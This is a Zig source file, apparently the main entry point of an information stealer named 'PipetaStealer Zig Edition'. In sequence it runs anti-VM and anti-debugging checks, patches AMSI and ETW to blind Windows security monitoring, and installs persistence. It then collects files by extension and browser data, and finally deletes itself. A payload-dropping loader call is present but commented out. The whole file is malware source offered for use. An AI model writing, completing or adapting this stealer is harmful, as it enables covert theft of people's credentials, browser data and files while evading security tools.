const std = @import("std");
const direto = @import("direto/direto.zig");
const furtivo = @import("furtivo.zig");
const ajuste = @import("ajuste.zig");
const fixar = @import("fixar.zig");
const sondar = @import("sondar.zig");
const extrair = @import("extrair.zig");
const loader = @import("loader.zig");

pub fn main() !void {
    const allocator = std.heap.page_allocator;
    var threaded = std.Io.Threaded.init(allocator, .{});
    defer threaded.deinit();
    const io = threaded.io();

    std.debug.print("PipetaStealer Zig Edition\n", .{});
    
    // Configurações
    if (ajuste.anti_vm or ajuste.anti_debug) {
        if (!furtivo.runAntiAnalysis()) {
            std.process.exit(0);
        }
    }

    // Loader drop payload flow
    // try loader.main(io);

    // Patch AMSI & ETW
    furtivo.patchAMSI();
    furtivo.patchETW();

    if (ajuste.persistir) {
        fixar.install() catch {};
    }

    if (ajuste.pegador_arquivos) {
        std.debug.print("Buscando arquivos...\n", .{});
        const files = sondar.pegarArquivos(allocator, io, &ajuste.extensoes_arquivo, ajuste.tamanho_max_arquivo, &ajuste.caminhos_pegador) catch &[_]sondar.ArquivoPegado{};
        std.debug.print("Arquivos encontrados: {d}\n", .{files.len});
        // Free files logic...
    }

    if (ajuste.roubar_navegadores) {
        std.debug.print("Extraindo navegadores...\n", .{});
        try extrair.tudo(allocator, io);
    }

    if (ajuste.auto_destruir) {
        fixar.selfDelete(io) catch {};
    }
}
